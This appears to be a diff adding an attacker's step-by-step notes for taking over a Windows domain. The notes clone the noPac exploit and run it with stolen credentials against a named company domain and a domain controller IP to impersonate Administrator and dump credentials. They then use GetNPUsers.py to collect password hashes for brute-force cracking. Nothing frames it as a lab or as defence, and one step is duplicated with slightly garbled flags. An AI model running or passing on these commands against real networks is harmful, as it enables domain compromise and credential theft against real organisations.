@@ -1,0 +1,25 @@
+So first of all
+git clone https://github.com/Ridter/noPac
+
+Next, we substitute our data
+And we try them on every IP where our 88 cd port is present
+noPac
+python noPac.py rush-enterprises.com/engineering.calendar:password -dc-ip 10.0.0.21 --impersonate Administrator -dump -use-ldap
+
+Next will be a dump of credits as in zerologon
+What to do with them next was shown in the first part I will not explain.
+
+If noPac is unlucky, we try to extract the hashed passwords from the domain.
+Let's go to the impact in kali
+
+GetNPUsers.py rush-enterprises.com/-users file /home/kali/user.txt -no-pass -dc-ip 192.168.17.72 -request
+
+We put a list of found users in the user file if you are lucky get hashes for brute =)
+
+GetNPUsers.py rush-enterprises.com/-users file /home/kali/user.txt -no-pass -dc-ip 192.168.17.72 -request
+
+We put a list of found users in the user file if you are lucky get hashes for brute =)
+
+
+
+
